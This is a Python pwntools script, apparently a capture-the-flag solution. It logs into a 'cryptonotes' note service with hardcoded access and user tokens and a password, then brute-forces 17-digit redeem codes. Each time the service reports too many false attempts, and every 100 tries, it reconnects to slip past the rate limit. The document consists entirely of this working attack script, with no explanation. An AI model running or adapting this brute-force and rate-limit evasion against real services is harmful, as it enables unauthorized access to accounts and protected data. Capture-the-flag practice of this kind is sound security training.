from pwn import remote
import time

HOST = 'cryptonotes.is.hackthe.space'
PORT = 65430

access_token = 'lxlRl8ZJPo/dd/m+5j1lsyGz+clO/y4klInWiEXYDl4='
user_token = 'xCezBYRiCgZvu7JkDNwyJWzhpuyUTmiJZ9X967hJcayYCfKs8DuJGROJrdG01Mlyix0oWA56NAtFIQq3E/KkDqNnLR42'
password = 'Marko123!'

from itertools import count

# Connect and login first
def login():
    io = remote(HOST, PORT)
    io.recvuntil(b'choice:')
    io.sendline(b'2')  # Login
    io.sendlineafter(b'user token', user_token.encode())
    io.sendlineafter(b'password', password.encode())
    return io

def redeem_attempt(io, code):
    io.sendlineafter(b'choice:', b'2')  # Redeem access token
    io.sendlineafter(b'access token', access_token.encode())
    io.sendlineafter(b'redeem code', code.encode())
    result = io.recv(timeout=2)
    if b'Here is the note' in result:
        note = io.recvline(timeout=2)
        print("[+] SUCCESS with redeem code:", code)
        print("[+] Note:", note.decode())
        return True
    if b'Too many false attempts' in result:
        print("[!] Hit attempt limit, reconnecting...")
        return 'limit'
    return False

# Brute force redeem codes with reconnect
start_guess = 10000000000000000
max_guess = start_guess + 100000
attempts = 0
io = login()

for guess in count(start=start_guess):
    code = str(guess).zfill(17)
    print("[*] Trying:", code)
    result = redeem_attempt(io, code)

    if result == True:
        break
    elif result == 'limit':
        io.close()
        io = login()
        continue

    attempts += 1
    if attempts >= 100:
        io.close()
        io = login()
        attempts = 0